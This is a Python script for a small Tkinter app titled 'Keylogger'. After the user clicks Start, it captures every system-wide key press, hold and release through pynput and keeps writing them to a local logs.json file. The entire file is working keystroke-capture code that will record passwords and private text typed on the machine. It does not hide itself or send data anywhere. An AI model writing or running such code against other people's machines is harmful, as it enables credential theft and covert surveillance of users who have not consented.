import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading

root = tk.Tk()
root.geometry("250x300")
root.title("Keylogger")

# Set the background image
background_image = PhotoImage(file="b.png")
background_label = Label(root, image=background_image)
background_label.place(x=0, y=0, relwidth=1, relheight=1)

key_list = []
x = False
key_strokes = ""

def update_json_file(key_list):
    with open('logs.json', 'w') as key_log:
        json.dump(key_list, key_log)

def on_press(key):
    global x, key_list
    if not x:
        key_list.append({'Pressed': f'{key}'})
    x = True
    if x:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    if x:
        x = False
    update_json_file(key_list)

def start_keylogger():
    print("[+] Keylogger started successfully!")
    print("[!] Saving the key logs in 'logs.json'")
    keylogger_thread = threading.Thread(target=run_keylogger)
    keylogger_thread.start()

def run_keylogger():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def close_interface():
    root.destroy()


label = Label(root, text="Click Start to begin keylogging.")
label.place(relx=0.5, rely=0.3, anchor=CENTER)

start_button = Button(root, text="Start", command=start_keylogger)
start_button.place(relx=0.5, rely=0.5, anchor=CENTER)

stop_button = Button(root, text="Stop", command=close_interface, state='normal')
stop_button.place(relx=0.5, rely=0.7, anchor=CENTER)

root.mainloop()
